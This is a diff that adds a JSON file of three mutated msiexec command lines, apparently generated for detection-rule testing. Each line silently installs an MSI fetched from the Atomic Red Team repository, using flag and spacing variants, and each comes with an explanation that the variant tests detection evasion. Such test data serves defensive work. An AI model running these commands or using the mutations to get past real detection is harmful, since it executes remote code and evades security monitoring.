@@ -1,0 +1,14 @@
+[
+  {
+    "output": "c:\\windows\\system32\\msiexec.exe /quiet /i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"",
+    "explanation": "The original command uses '/q' for quiet mode and '/i' for installation. This mutated command replaces '/q' with '/quiet', which is an equivalent long-form option. The rest of the command remains unchanged, ensuring the same behavior while testing for detection evasion."
+  },
+  {
+    "output": "c:\\windows\\system32\\msiexec.exe -q -i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"",
+    "explanation": "This command substitutes the forward slashes with hyphens for the '/q' and '/i' flags, which is a valid syntax in Windows command-line interfaces. The behavior remains the same, making it a safe mutation for testing."
+  },
+  {
+    "output": "c:\\windows\\system32\\msiexec.exe /q /i\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"",
+    "explanation": "This command removes the space between '/i' and the URL, which is still valid syntax for msiexec.exe. The behavior is preserved, and it tests whether the detection rule accounts for such spacing variations."
+  }
+]
